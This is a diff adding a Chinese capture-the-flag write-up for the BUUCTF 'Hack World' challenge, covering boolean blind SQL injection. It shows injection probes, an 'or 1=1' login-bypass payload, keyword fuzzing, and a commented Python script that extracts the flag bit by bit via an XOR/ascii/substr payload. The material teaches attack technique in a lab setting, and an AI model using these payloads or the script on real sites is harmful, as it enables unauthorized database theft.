@@ -1747,6 +1747,104 @@ if($arr[1] == "admin"){
 
 原文链接：https://blog.csdn.net/m0_73734159/article/details/134731461?spm=1001.2014.3001.5501
 
+## BUUCTF [CISCN2019 华北赛区 Day2 Web1]Hack World 1(SQL注入之布尔盲注）
+
+**题目环境**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701499412205-2a68d506-4efb-4b8e-a3d5-860608c3f4e5.png#averageHue=%23f9f9f8&clientId=ubf966a03-4bf0-4&from=paste&height=214&id=u94d001e6&originHeight=268&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45159&status=done&style=none&taskId=u38c3b47e-6102-423d-8daa-cc8b4d96086&title=&width=1535.2)<br />**判断注入类型**
+> 1
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1702105032722-bfed563f-03b6-4c41-af51-9bd67567ab11.png#averageHue=%23f6f5f4&clientId=uc4a09211-0e12-4&from=paste&height=172&id=ud366e577&originHeight=215&originWidth=806&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17594&status=done&style=none&taskId=u614ff869-2680-4122-ba08-476ed35d970&title=&width=644.8)
+> 2
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1702105195085-058822a3-c9ca-4465-8aab-2b0fb22a0a08.png#averageHue=%23f2f1f0&clientId=uc4a09211-0e12-4&from=paste&height=150&id=u91d0a525&originHeight=187&originWidth=652&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17233&status=done&style=none&taskId=u5066dae3-b9bd-4509-811c-440bede28ed&title=&width=521.6)
+> 3
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1702105214418-6414dbaf-80cb-49aa-9593-a324f3902109.png#averageHue=%23f5f3f3&clientId=uc4a09211-0e12-4&from=paste&height=177&id=u786b479c&originHeight=221&originWidth=678&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17559&status=done&style=none&taskId=u56822979-43f6-4aec-8197-1dd4eda1372&title=&width=542.4)
+> 1'
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1702105064028-4eb02b45-32d1-437f-b566-a56f3305857f.png#averageHue=%23f7f7f6&clientId=uc4a09211-0e12-4&from=paste&height=172&id=u46734dca&originHeight=215&originWidth=863&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=17026&status=done&style=none&taskId=ud47a544a-5572-4d86-b9de-31af32cce86&title=&width=690.4)
+> 输入1'报错提示bool(false)
+> 可知是字符型的布尔注入（盲注）
+
+**尝试万能密码**
+> 1' or '1'=1
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1702106971646-14b185f6-7975-47ca-b5ff-ec3ffc8f5af2.png#averageHue=%23f6f5f4&clientId=uc4a09211-0e12-4&from=paste&height=171&id=u5bc58d23&originHeight=214&originWidth=823&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=18111&status=done&style=none&taskId=u90db76dc-6ba2-467e-9e72-2cf8d0fb8bc&title=&width=658.4)
+> 已检测SQL注入
+> 猜测某些关键字或者字符被过滤
+
+**FUZZ字典爆破**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1702107712545-05ed2461-624e-4ee0-a6e4-7e8c4e29e40d.png#averageHue=%23fbfbfb&clientId=uc4a09211-0e12-4&from=paste&height=730&id=uac626760&originHeight=913&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108281&status=done&style=none&taskId=u54f90fbe-83d8-43e0-bf61-42ce039a23f&title=&width=1534.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1702107778794-28bd3f37-cccd-4c59-821a-e5b52b8552ce.png#averageHue=%23fbfaf9&clientId=uc4a09211-0e12-4&from=paste&height=735&id=ub7da508f&originHeight=919&originWidth=1916&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=110176&status=done&style=none&taskId=u17bdb059-5f0d-45ed-bf97-e734ce7bddb&title=&width=1532.8)
+> 可以看到部分关键字被过滤，包括空格
+
+> All You Want Is In Table 'flag' and the column is 'flag'
+> Now, just give the id of passage
+> 通过提示可以知道
+> flag字段在flag数据表里面
+
+**布尔注入**
+> 布尔注入是一种常见的SQL注入攻击技术，攻击者通过构造恶意输入，使应用程序的SQL查询返回不同的结果，从而达到绕过应用程序的安全机制，获取未授权的信息或执行恶意操作的目的。
+
+**布尔盲注**
+> 布尔盲注，也称为基于布尔的盲注，是一种SQL注入攻击方式。这种攻击方式主要利用Web页面的返回结果，根据页面返回的True或者是False来得到数据库中的相关信息。
+> 在进行布尔盲注攻击时，攻击者首先需要对目标应用程序进行SQL注入，然后根据页面返回的结果来判断注入是否成功。由于页面没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入。因此，这种攻击方式比较消耗时间，速度较慢。
+> 在布尔盲注中，攻击者可能会使用一些常用的函数，如length（）函数和ascii（）函数。length（）函数用于返回字符串的长度，ascii（）函数用于返回字符串的字符ASCII码值。这些函数可以帮助攻击者更好地分析和理解返回结果，从而获取更多的信息。
+> 总之，布尔盲注是一种比较复杂的SQL注入攻击方式，需要攻击者具备一定的技术水平和耐心。为了防止布尔盲注攻击，应该加强应用程序的安全性，如进行输入验证、使用参数化查询等措施。
+
+**通过脚本爆破flag**
+```python
+import requests
+#调用请求模块
+import time
+#调用时间模块
+import re
+#调用规则表达式模块
+url='http://1c6ac3dd-eab6-41d6-85a3-a5f888577768.node4.buuoj.cn:81/'
+#题目链接
+flag = ''
+#创建一个变量用来存放flag值
+for i in range(1,50):
+    #for循环遍历，i表示flag值大致长度是50以内
+    max = 127
+    #赋值127
+    min = 0
+    #赋值0
+    for c in range(0,127):
+        #for循环遍历
+        s = (int)((max+min)/2)
+        #首先将 max 和 min 相加，然后除以 2，最后将结果强制转换为整数类型。
+        payload = '1^(ascii(substr((select(flag)from(flag)),'+str(i)+',1))>'+str(s)+')'
+        #^异或运算符，相同为假，不相同为真，1^payload，若为payload结果为假，则返回0，1^0=1，将得到查询id=1时的结果，回显Hello, glzjin wants a girlfriend。
+        #从flag数据表中选择一个名为flag的字段，然后取这个字段的字符串（从位置 '+str(i)+' 开始，长度为 1（每次只返回一个））
+        #将这个字符串转换为 ASCII 码，然后判断这个 ASCII 码是否大于一个名为 "s" 的变量。
+        r = requests.post(url,data = {'id':payload})
+        #requests模块的运用，将payload赋值给题目中这个名为id的参数
+        time.sleep(0.005)
+        #每循环一次休眠0.005秒
+        if 'Hello' in str(r.content):
+            #如果Hello这个字符串在生成的结果中，那么就继续向下进行
+            max=s
+        #将s的值赋值给max
+        else:
+            #反之
+            min=s
+        #将s的值赋值给min
+        if((max-min)<=1):
+            #如果max-min的值
+            flag+=chr(max)
+            #将max的ASCII值转化为字符串
+            print(flag)
+            #输出flag
+            break
+            #跳出循环
+
+
+```
+> 脚本里面已添加注释
+> 希望能帮助大家更好的理解
+
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1702109164971-d7844306-38f2-4ec7-a340-43ce8641b7bf.png#averageHue=%230c0c0c&clientId=uc4a09211-0e12-4&from=paste&height=720&id=uf42ed381&originHeight=900&originWidth=1250&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=108229&status=done&style=none&taskId=ue59c152b-6e68-417b-9366-2b8bf1886c5&title=&width=1000)<br />**得到flag：**<br />`flag{7a?ec496-a77b-4foa-9748-c6382beoa0c}`
+
+原文链接：https://blog.csdn.net/m0_73734159/article/details/134897576?spm=1001.2014.3001.5502
+
 
 
 
